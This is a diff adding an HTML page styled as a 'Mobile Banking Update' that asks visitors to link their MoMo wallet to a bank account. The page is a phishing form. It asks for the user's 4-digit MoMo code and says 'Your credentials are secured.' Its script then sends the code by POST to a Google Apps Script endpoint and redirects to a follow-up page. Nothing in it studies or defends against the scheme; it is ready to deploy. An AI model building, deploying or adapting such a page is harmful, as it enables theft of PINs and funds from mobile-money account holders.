@@ -1,1 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MOBILE BANKING UPDATE</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 0 10px;
+      box-sizing: border-box;
+    }
 
+    .header {
+      text-align: center;
+      width: 100%;
+      padding: 40px 20px;
+      background: linear-gradient(135deg, #08143a, #0b1d4d);
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      margin-bottom: 30px;
+    }
+
+    .header h1 {
+      margin: 0;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    .header p {
+      margin: 10px 0 0;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+
+    .form-container {
+      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+      width: 100%;
+      max-width: 400px;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #fff;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border-radius: 6px;
+      border: 1px solid #274080;
+      background-color: rgba(11,29,77,0.9);
+      color: #fff;
+      font-size: 14px;
+    }
+
+    input::placeholder {
+      color: #ccc;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .btn-submit:hover {
+      background: linear-gradient(135deg, #187bcd, #1560a3);
+      transform: scale(1.02);
+    }
+
+    .notice {
+      font-size: 13px;
+      color: #ccc;
+      text-align: center;
+      margin-top: 12px;
+    }
+
+    @media (max-width: 500px) {
+      .header h1 { font-size: 20px; }
+      .form-container { padding: 25px 15px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>MOBILE BANKING UPDATE</h1>
+    <p>ACCOUNT TO WALLET ACTIVATION<br>
+       Link your MoMo to your Bank Account Below
+    </p>
+  </div>
+
+  <div class="form-container">
+    <form id="momoForm">
+      <label for="momo_code">Enter 4 digits MoMo Code</label>
+      <input type="text" id="momo_code" name="momo_code" placeholder="1234" maxlength="4" required>
+
+      <button type="submit" class="btn-submit">Link Wallet →</button>
+
+      <div class="notice" id="status">Your credentials are secured.</div>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('momoForm');
+    const statusEl = document.getElementById('status');
+
+    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbxJ1nxxUbrn8N7ancnw_Tc2gUJBJbvsOzuwRR5wJYNS1bF_0bckmYAYeItN1-eEsNbT/exec";
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      statusEl.textContent = "Submitting...";
+      statusEl.style.color = "#ccc";
+
+      const momo_code = document.getElementById('momo_code').value.trim();
+
+      const formData = new FormData();
+      formData.append("momo_code", momo_code);
+
+      try {
+        const resp = await fetch(WEBAPP_URL, { method: 'POST', body: formData });
+        const text = await resp.text();
+        let json;
+
+        try {
+          json = JSON.parse(text);
+        } catch {
+          statusEl.textContent = "Server error: " + text;
+          statusEl.style.color = "#ff6666";
+          return;
+        }
+
+        if (json.result === "success") {
+          window.location.href = "continue.html";
+        } else {
+          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
+          statusEl.style.color = "#ff6666";
+        }
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = "Network error. Try again.";
+        statusEl.style.color = "#ff6666";
+      }
+    });
+  </script>
+</body>
+</html>
